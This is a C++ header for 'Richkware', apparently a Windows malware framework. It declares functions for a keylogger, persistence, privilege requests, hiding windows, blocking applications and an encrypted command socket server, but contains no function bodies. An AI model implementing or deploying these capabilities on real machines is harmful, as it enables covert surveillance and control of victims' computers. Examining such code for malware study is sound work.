/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#define _WIN32_WINNT  0x501
#define MAX_THREAD 8

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <windef.h>
#include <winerror.h>
#include <winnt.h>
#include <winreg.h>
#include <winuser.h>

#include <iostream>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <sstream>
#include <ctime>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>
#include <map>

#include "crypto.h"

class Richkware {
private:
	HANDLE hBlockAppsTh;
	std::map<std::string, std::string> session;

	void SaveValueReg(const char* path, const char* key, const char* value);
	std::string LoadValueReg(const char* path, const char* key);
	void SaveValueToFile(const char* value, const char* path = NULL);
	std::string LoadValueFromFile(const char* path = NULL);

	void SaveSession(const char* EncryptionKey);
	void LoadSession(const char* EncryptionKey);
	
public:
	std::list<const char*> dangerousApps;
	const char* EncryptionKey;

	void SaveInfo(const char* key, const char* value);
	std::string FindInfo(const char* key);
	void RemoveInfo(const char* key);
	
	BOOL IsAdmin();
	void RequestAdminPrivileges();
	void Persistance();
	void StealthWindow(const char* window);
	void OpenApp(const char* app);
	void BlockApps();
	void UnBlockApps();
	void Keylogger(const char* fileName);
	bool CheckSession();
	bool CheckPersistance();
	void Initialize(const char* EncryptionKey);

	int StartServer(const char* port, const char* EncryptionKey = NULL);
	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
	
	void Hibernation();
	void RandMouse();

};

struct ClientSocketArgs {
	SOCKET ClientSocket;
	const char* EncryptionKey;
};

std::string EncryptDecrypt(std::string input, const char* key);

DWORD WINAPI ClientSocketThread(void* arg);
DWORD WINAPI BlockAppsThread(void* arg);
DWORD WINAPI KeyloggerThread(void* arg);

#endif /* RICHKWARE_H_ */
